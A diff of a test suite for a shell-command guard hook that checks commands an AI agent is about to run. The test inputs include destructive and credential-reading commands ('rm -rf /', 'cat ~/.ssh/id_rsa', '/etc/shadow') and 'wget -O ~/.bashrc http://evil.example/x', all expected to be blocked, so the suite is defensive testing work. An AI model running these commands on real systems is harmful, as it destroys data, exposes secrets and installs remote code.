@@ -62,47 +62,48 @@ function runTests() {
 
   let passed = 0;
   let failed = 0;
+  const tally = ok => (ok ? passed++ : failed++);
 
-  if (test('allows a safe allowlisted command', () => {
+  tally(test('allows a safe allowlisted command', () => {
     const result = runHook('git status');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('allows a compound command of safe segments', () => {
+  tally(test('allows a compound command of safe segments', () => {
     const result = runHook('cd /tmp && npm run build');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('allows a non-allowlisted command (advisory, never blocks)', () => {
+  tally(test('allows a non-allowlisted command (advisory, never blocks)', () => {
     const result = runHook('python3 script.py');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
   // A heredoc body is stdin data, not words the shell hands the command: a
   // commit message, a log line or a document that names a protected path is
   // not an argument. An interpreter reading its script from the heredoc is
   // the exception, because there the body is code.
-  if (test('a heredoc body naming a protected path is data, not an argument', () => {
+  tally(test('a heredoc body naming a protected path is data, not an argument', () => {
     const result = runHook("printf '%s' x > notes.md <<'EOF'\nwe keep the key in ~/.ssh/config\nEOF");
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc body an interpreter reads is validated as the code it is', () => {
+  tally(test('a heredoc body an interpreter reads is validated as the code it is', () => {
     const result = runHook("bash <<'EOF'\nrm -rf /tmp/x\nEOF");
     assert.strictEqual(result.code, 2, 'Expected the script body to be analyzed and blocked');
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc script behind a wrapper is validated too', () => {
+  tally(test('a heredoc script behind a wrapper is validated too', () => {
     const result = runHook("sudo bash <<'EOF'\nrm -rf /tmp/x\nEOF");
     assert.strictEqual(result.code, 2, 'Expected the wrapper to be peeled before the interpreter check');
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc body stays code when the shell got its script through -c, which can read stdin', () => {
+  tally(test('a heredoc body stays code when the shell got its script through -c, which can read stdin', () => {
     const result = runHook("bash -c 'sh' <<'EOF'\nrm -rf /tmp/x\nEOF");
     assert.strictEqual(result.code, 2, `Expected block: the -c script can execute its input, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc is data when the shell was given a script file to run', () => {
+  tally(test('a heredoc is data when the shell was given a script file to run', () => {
     const scriptFile = path.join(os.tmpdir(), `egc-heredoc-script-${Date.now()}.sh`);
     fs.writeFileSync(scriptFile, 'echo hi\n');
     try {
@@ -111,108 +112,108 @@ function runTests() {
     } finally {
       try { fs.rmSync(scriptFile, { force: true }); } catch { /* best-effort cleanup */ }
     }
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc delimiter with punctuation still marks its body as data', () => {
+  tally(test('a heredoc delimiter with punctuation still marks its body as data', () => {
     const result = runHook("printf '%s' x > notes.md <<'EOF-1'\nthe key lives in ~/.ssh/config\nEOF-1");
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a line continuation stays one segment instead of two', () => {
+  tally(test('a line continuation stays one segment instead of two', () => {
     const segments = extractSegments('cat \\\n  ~/.ssh/id_rsa');
     assert.strictEqual(segments.length, 1, `Expected one segment, got: ${JSON.stringify(segments)}`);
     assert.ok(segments[0].includes('.ssh/id_rsa'), JSON.stringify(segments));
     const result = runHook('cat \\\n  ~/.ssh/id_rsa');
     assert.strictEqual(result.code, 2, 'Expected the protected path to block');
-  })) passed++; else failed++;
+  }));
 
   // `egc run --shell` hands its words to a shell as one script, so the
   // script is judged segment by segment, like a heredoc a shell reads.
-  if (test('a compound script handed to egc run --shell is validated segment by segment', () => {
+  tally(test('a compound script handed to egc run --shell is validated segment by segment', () => {
     const result = runHook('egc run --shell "ls && rm -rf /tmp/x"');
     assert.strictEqual(result.code, 2, `Expected the second segment to block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a safe script handed to egc run --shell still runs', () => {
+  tally(test('a safe script handed to egc run --shell still runs', () => {
     const result = runHook('egc run --shell "git status | head"');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a script handed to egc run --shell behind a wrapper is read the same way', () => {
+  tally(test('a script handed to egc run --shell behind a wrapper is read the same way', () => {
     const result = runHook('env FOO=bar egc run --shell "git status; rm -rf /tmp/x"');
     assert.strictEqual(result.code, 2, `Expected the second segment to block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a script that starts with a dash is still the script, not an option', () => {
+  tally(test('a script that starts with a dash is still the script, not an option', () => {
     const result = runHook('egc run --shell "-x && rm -rf /tmp/y"');
     assert.strictEqual(result.code, 2, `Expected the second segment to block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('egc run reads one option only: after --raw, --shell is the program it would run', () => {
+  tally(test('egc run reads one option only: after --raw, --shell is the program it would run', () => {
     const segments = extractSegments('egc run --raw --shell "a && b"');
     assert.deepStrictEqual(segments, ['egc run --raw --shell "a && b"']);
-  })) passed++; else failed++;
+  }));
 
-  if (test('egc run without --shell keeps the wrapped command as it is', () => {
+  tally(test('egc run without --shell keeps the wrapped command as it is', () => {
     const result = runHook('egc run git log --oneline');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc inside a script handed to egc run --shell is read as the shell reads it', () => {
+  tally(test('a heredoc inside a script handed to egc run --shell is read as the shell reads it', () => {
     const result = runHook('egc run --shell "bash <<EOF\nrm -rf /tmp/x\nEOF"');
     assert.strictEqual(result.code, 2, `Expected the heredoc body to block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a heredoc fed to egc run --shell reaches the shell the script names', () => {
+  tally(test('a heredoc fed to egc run --shell reaches the shell the script names', () => {
     const result = runHook("egc run --shell bash <<'EOF'\nrm -rf /tmp/x\nEOF");
     assert.strictEqual(result.code, 2, `Expected the heredoc body to block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('the segments of egc run --shell are the command plus the script split up, heredoc body included', () => {
+  tally(test('the segments of egc run --shell are the command plus the script split up, heredoc body included', () => {
     assert.deepStrictEqual(
       extractSegments('egc run --shell "git status && git diff"'),
       ['egc run --shell "git status && git diff"', 'git status', 'git diff']
     );
     const withHeredoc = extractSegments('egc run --shell "bash <<EOF\nrm -rf /tmp/x\nEOF"');
     assert.ok(withHeredoc.includes('rm -rf /tmp/x'), `the heredoc body inside the script must be a segment, got: ${JSON.stringify(withHeredoc)}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a verdict that says advisory is false blocks even when its reason carries an advisory phrase', () => {
+  tally(test('a verdict that says advisory is false blocks even when its reason carries an advisory phrase', () => {
     const result = runHook('advisory-probe-hard');
     assert.strictEqual(result.code, 2, `Expected block, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('a verdict that says advisory is true never blocks even without an advisory phrase', () => {
+  tally(test('a verdict that says advisory is true never blocks even without an advisory phrase', () => {
     const result = runHook('advisory-probe-soft');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks a destructive command', () => {
+  tally(test('blocks a destructive command', () => {
     const result = runHook('rm -rf /');
     assert.strictEqual(result.code, 2, 'Expected rm to be blocked');
     assert.ok(result.stderr.includes('destructive command'), `Expected reason, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks a destructive command hidden behind chaining', () => {
+  tally(test('blocks a destructive command hidden behind chaining', () => {
     const result = runHook('git status && rm -rf ~');
     assert.strictEqual(result.code, 2, 'Expected chained rm to be blocked');
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks a destructive command behind sudo', () => {
+  tally(test('blocks a destructive command behind sudo', () => {
     const result = runHook('sudo rm -rf /etc');
     assert.strictEqual(result.code, 2, 'Expected sudo rm to be blocked');
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks reads of protected paths', () => {
+  tally(test('blocks reads of protected paths', () => {
     const result = runHook('cat ~/.ssh/id_rsa');
     assert.strictEqual(result.code, 2, 'Expected protected path read to be blocked');
     assert.ok(result.stderr.includes('protected path'), `Expected reason, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks git force-push', () => {
+  tally(test('blocks git force-push', () => {
     const result = runHook('git push --force origin main');
     assert.strictEqual(result.code, 2, 'Expected force-push to be blocked');
-  })) passed++; else failed++;
+  }));
 
   // A stand-in validator written from the given source, so the hook can be
   // exercised against one that crashes, stalls or answers nonsense.
@@ -226,15 +227,15 @@ function runTests() {
     }
   }
 
-  if (test('blocks the command and says the validator stopped when it crashes', () => {
+  tally(test('blocks the command and says the validator stopped when it crashes', () => {
     const result = runWithValidator('process.exit(1);\n', 'rm -rf /');
     assert.strictEqual(result.code, 2, `Expected a block without a verdict, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('could not validate this command'), result.stderr);
     assert.ok(result.stderr.includes('exit code 1'), result.stderr);
     assert.ok(result.stderr.includes('egc doctor'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command and says the validator did not answer in time when it stalls', () => {
+  tally(test('blocks the command and says the validator did not answer in time when it stalls', () => {
     // The budget comes from the environment here so the case does not sit
     // through the four seconds a user gets.
     const result = runWithValidator('setTimeout(() => {}, 30000);\n', 'git status', { EGC_GUARDIAN_TIMEOUT_MS: '300' });
@@ -242,33 +243,33 @@ function runTests() {
     assert.ok(result.stderr.includes('did not answer within 0.3 seconds'), result.stderr);
     assert.ok(result.stderr.includes('Nothing was executed'), result.stderr);
     assert.ok(result.stderr.includes('EGC_GUARDIAN_TIMEOUT_MS'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command when the validator answers fewer verdicts than there are segments', () => {
+  tally(test('blocks the command when the validator answers fewer verdicts than there are segments', () => {
     const result = runWithValidator("process.stdout.write(JSON.stringify([{ allowed: true }]));\n", 'git status && git log');
     assert.strictEqual(result.code, 2, `Expected a block without a verdict for every segment, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('incomplete list of verdicts'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command when a verdict entry carries no allowed flag', () => {
+  tally(test('blocks the command when a verdict entry carries no allowed flag', () => {
     const result = runWithValidator("process.stdout.write(JSON.stringify([{}, null]));\n", 'git status && git log');
     assert.strictEqual(result.code, 2, `Expected a block on an entry that is not a verdict, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('an entry that is not a verdict'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command and says the answer is not a list when the validator answers an object', () => {
+  tally(test('blocks the command and says the answer is not a list when the validator answers an object', () => {
     const result = runWithValidator("process.stdout.write('{}');\n", 'git status');
     assert.strictEqual(result.code, 2, `Expected a block on an answer that is not a list, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('not a list of verdicts'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command and says the answer was empty when the validator prints nothing', () => {
+  tally(test('blocks the command and says the answer was empty when the validator prints nothing', () => {
     const result = runWithValidator('process.exit(0);\n', 'git status');
     assert.strictEqual(result.code, 2, `Expected a block on an empty answer, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('an empty answer'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command within the budget even when the validator ignores the termination signal', () => {
+  tally(test('blocks the command within the budget even when the validator ignores the termination signal', () => {
     const result = runWithValidator(
       "process.on('SIGTERM', () => {});\nsetTimeout(() => {}, 30000);\n",
       'git status',
@@ -276,21 +277,21 @@ function runTests() {
     );
     assert.strictEqual(result.code, 2, `Expected a block within the budget, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('did not answer within 0.3 seconds'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command and names the output limit when the validator answers past it', () => {
+  tally(test('blocks the command and names the output limit when the validator answers past it', () => {
     const result = runWithValidator("process.stdout.write('x'.repeat(2 * 1024 * 1024));\n", 'git status');
     assert.strictEqual(result.code, 2, `Expected a block on an answer past the output limit, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('past the output limit'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks the command and says the answer was unreadable when the validator prints something that is not JSON', () => {
+  tally(test('blocks the command and says the answer was unreadable when the validator prints something that is not JSON', () => {
     const result = runWithValidator("process.stdout.write('not a verdict');\n", 'git status');
     assert.strictEqual(result.code, 2, `Expected a block without a verdict, got ${result.code}: ${result.stderr}`);
     assert.ok(result.stderr.includes('could not read'), result.stderr);
-  })) passed++; else failed++;
+  }));
 
-  if (test('fails open (exercised, not just documented) when no Guardian CLI resolves at all', () => {
+  tally(test('fails open (exercised, not just documented) when no Guardian CLI resolves at all', () => {
     // resolveGuardianCli() returning falsy is the real "no build, no
     // override, no trusted MCP config" state, not just a hypothetical.
     // Reproducing it via a subprocess on a temp copy of the hook would run
@@ -322,9 +323,9 @@ function runTests() {
       if (originalGuardianBinEntry) require.cache[guardianBinPath] = originalGuardianBinEntry;
       if (originalHookEntry) require.cache[hookPath] = originalHookEntry;
     }
-  })) passed++; else failed++;
+  }));
 
-  if (test('passes through input without a command field', () => {
+  tally(test('passes through input without a command field', () => {
     const rawInput = JSON.stringify({ tool_name: 'Bash', tool_input: {} });
     const result = spawnSync('node', [runner, 'pre:bash:guardian-validate', 'scripts/hooks/pre-bash-guardian-validate.js', 'minimal,standard,strict'], {
       input: rawInput,
@@ -335,30 +336,30 @@ function runTests() {
     });
     assert.strictEqual(result.status, 0, 'Expected pass for missing command');
     assert.strictEqual(result.stdout, rawInput, 'Expected raw passthrough');
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks a destructive command hidden inside a $(...) command substitution', () => {
+  tally(test('blocks a destructive command hidden inside a $(...) command substitution', () => {
     const result = runHook('echo $(rm -rf /)');
     assert.strictEqual(result.code, 2, 'Expected the substitution body to be extracted and blocked');
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks a destructive command hidden inside a backtick substitution', () => {
+  tally(test('blocks a destructive command hidden inside a backtick substitution', () => {
     const result = runHook('echo `rm -rf /`');
     assert.strictEqual(result.code, 2, 'Expected the substitution body to be extracted and blocked');
-  })) passed++; else failed++;
+  }));
 
-  if (test('allows a benign command with a $(...) substitution that resolves to nothing dangerous', () => {
+  tally(test('allows a benign command with a $(...) substitution that resolves to nothing dangerous', () => {
     const result = runHook('echo $(date)');
     assert.strictEqual(result.code, 0, `Expected allow, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('extractSegments fails closed (returns null) when a destructive command is nested one level past MAX_SUBSTITUTION_DEPTH', () => {
+  tally(test('extractSegments fails closed (returns null) when a destructive command is nested one level past MAX_SUBSTITUTION_DEPTH', () => {
     const command = nestedSubstitution(6, 'rm -rf /');
     const segments = extractSegments(command);
     assert.strictEqual(segments, null, `Expected null (too deep to analyze), got: ${JSON.stringify(segments)}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('extractSegments does not count arithmetic expansion as an extra substitution depth level', () => {
+  tally(test('extractSegments does not count arithmetic expansion as an extra substitution depth level', () => {
     // 5 layers of real `echo $(...)` nesting (right at MAX_SUBSTITUTION_DEPTH)
     // plus one innocuous arithmetic expansion at the bottom -- before the
     // arithmetic-awareness fix, $((1+2))'s spurious extra "nesting level"
@@ -367,27 +368,27 @@ function runTests() {
     const command = nestedSubstitution(5, 'echo $((1+2))');
     const segments = extractSegments(command);
     assert.notStrictEqual(segments, null, 'Arithmetic expansion must not count toward the substitution depth cap');
-  })) passed++; else failed++;
+  }));
 
-  if (test('extractSegments still finds a real command substitution hidden inside arithmetic expansion', () => {
+  tally(test('extractSegments still finds a real command substitution hidden inside arithmetic expansion', () => {
     const segments = extractSegments('echo $(( $(cat /etc/shadow) + 1 ))');
     assert.notStrictEqual(segments, null);
     assert.ok(segments.includes('cat /etc/shadow'), `Expected 'cat /etc/shadow' to be extracted, got: ${JSON.stringify(segments)}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('extractSegments still fully analyzes nesting within MAX_SUBSTITUTION_DEPTH (no regression)', () => {
+  tally(test('extractSegments still fully analyzes nesting within MAX_SUBSTITUTION_DEPTH (no regression)', () => {
     const command = nestedSubstitution(4, 'rm -rf /');
     const segments = extractSegments(command);
     assert.notStrictEqual(segments, null, 'Expected a real segment list, not the too-deep sentinel');
     assert.ok(segments.includes('rm -rf /'), `Expected 'rm -rf /' to be extracted, got: ${JSON.stringify(segments)}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('blocks (fails closed) end-to-end when a destructive command hides past the substitution depth cap', () => {
+  tally(test('blocks (fails closed) end-to-end when a destructive command hides past the substitution depth cap', () => {
     const result = runHook(nestedSubstitution(6, 'rm -rf /'));
     assert.strictEqual(result.code, 2, `Expected the hook to block instead of silently allowing, got exit ${result.code}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('runs standalone via node (require.main === module stdin path), not just through run-with-flags', () => {
+  tally(test('runs standalone via node (require.main === module stdin path), not just through run-with-flags', () => {
     const hookPath = path.join(__dirname, '..', '..', 'scripts', 'hooks', 'pre-bash-guardian-validate.js');
     const rawInput = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'git status' } });
     const result = spawnSync('node', [hookPath], {
@@ -399,9 +400,9 @@ function runTests() {
     });
     assert.strictEqual(result.status, 0, `Expected allow, got: ${result.stderr}`);
     assert.strictEqual(result.stdout, rawInput, 'Expected raw passthrough on stdout');
-  })) passed++; else failed++;
+  }));
 
-  if (test('runs standalone via node and blocks + writes stderr on a destructive command', () => {
+  tally(test('runs standalone via node and blocks + writes stderr on a destructive command', () => {
     const hookPath = path.join(__dirname, '..', '..', 'scripts', 'hooks', 'pre-bash-guardian-validate.js');
     const rawInput = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'rm -rf /' } });
     const result = spawnSync('node', [hookPath], {
@@ -413,9 +414,9 @@ function runTests() {
     });
     assert.strictEqual(result.status, 2, 'Expected block exit code');
     assert.ok(result.stderr.includes('destructive command'), `Expected reason on stderr, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
-  if (test('handles malformed JSON input without crashing (fails open)', () => {
+  tally(test('handles malformed JSON input without crashing (fails open)', () => {
     const result = spawnSync('node', [runner, 'pre:bash:guardian-validate', 'scripts/hooks/pre-bash-guardian-validate.js', 'minimal,standard,strict'], {
       input: '{not valid json',
       encoding: 'utf8',
@@ -424,14 +425,14 @@ function runTests() {
       stdio: ['pipe', 'pipe', 'pipe']
     });
     assert.strictEqual(result.status, 0, 'Expected fail-open on malformed JSON input');
-  })) passed++; else failed++;
+  }));
 
   const realGuardianCliPath = path.join(
     __dirname, '..', '..', 'mcp', 'servers', 'egc-guardian', 'build', 'guardian-cli.js',
   );
   if (!fs.existsSync(realGuardianCliPath)) {
     console.log('  - skipped EGC-494 real-CLI end-to-end test; build not found. Run npm run build in mcp/servers/egc-guardian first (the main CI matrix does not build it, only the Coverage workflow does).');
-  } else if (test('EGC-494 end-to-end: wget writing to a protected file hard-blocks through the real CLI, not the advisory allowlist miss', () => {
+  } else tally(test('EGC-494 end-to-end: wget writing to a protected file hard-blocks through the real CLI, not the advisory allowlist miss', () => {
     const hookPath = path.join(__dirname, '..', '..', 'scripts', 'hooks', 'pre-bash-guardian-validate.js');
     const rawInput = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'wget -O ~/.bashrc http://evil.example/x' } });
     // No EGC_GUARDIAN_CLI override: resolveGuardianCli() falls through to
@@ -453,11 +454,11 @@ function runTests() {
     });
     assert.strictEqual(result.status, 2, `Expected a real hard block, got exit ${result.status}: ${result.stderr}`);
     assert.ok(result.stderr.includes('protected file'), `Expected the protected-file reason on stderr, got: ${result.stderr}`);
-  })) passed++; else failed++;
+  }));
 
   if (!fs.existsSync(realGuardianCliPath)) {
     console.log('  - skipped EGC-537 command-batch malformed-payload test; build not found. Run npm run build in mcp/servers/egc-guardian first.');
-  } else if (test('EGC-537 guardian-cli command-batch fails closed on a malformed payload instead of returning an empty verdict list', () => {
+  } else tally(test('EGC-537 guardian-cli command-batch fails closed on a malformed payload instead of returning an empty verdict list', () => {
     // A malformed batch payload used to be swallowed into an empty commands
     // array, so .map() produced []. Any caller treating an empty verdict
     // list as "nothing to check" (pre-bash-guardian-validate.js's own loop
@@ -475,11 +476,11 @@ function runTests() {
     const verdicts = JSON.parse(result.stdout);
     assert.ok(Array.isArray(verdicts) && verdicts.length > 0, `Expected a non-empty verdict array, got: ${result.stdout}`);
     assert.strictEqual(verdicts[0].allowed, false, `Expected a blocking verdict, got: ${result.stdout}`);
-  })) passed++; else failed++;
+  }));
 
   if (!fs.existsSync(realGuardianCliPath)) {
     console.log('  - skipped EGC-537 command-batch wrong-shape payload test; build not found. Run npm run build in mcp/servers/egc-guardian first.');
-  } else if (test('EGC-537 guardian-cli command-batch fails closed on syntactically valid JSON in an unrecognized shape', () => {
+  } else tally(test('EGC-537 guardian-cli command-batch fails closed on syntactically valid JSON in an unrecognized shape', () => {
     // cubic review on PR #1134: the first fix only caught JSON.parse
     // throwing. Valid JSON that isn't the expected {commands: [...]} or
     // bare-array shape (an empty object, or commands as a non-array) parsed
@@ -499,7 +500,7 @@ function runTests() {
       assert.ok(Array.isArray(verdicts) && verdicts.length > 0, `Expected a non-empty verdict array for payload ${payload}, got: ${result.stdout}`);
       assert.strictEqual(verdicts[0].allowed, false, `Expected a blocking verdict for payload ${payload}, got: ${result.stdout}`);
     }
-  })) passed++; else failed++;
+  }));
 
   console.log(`\nResults: Passed: ${passed}, Failed: ${failed}`);
   process.exit(failed > 0 ? 1 : 0);
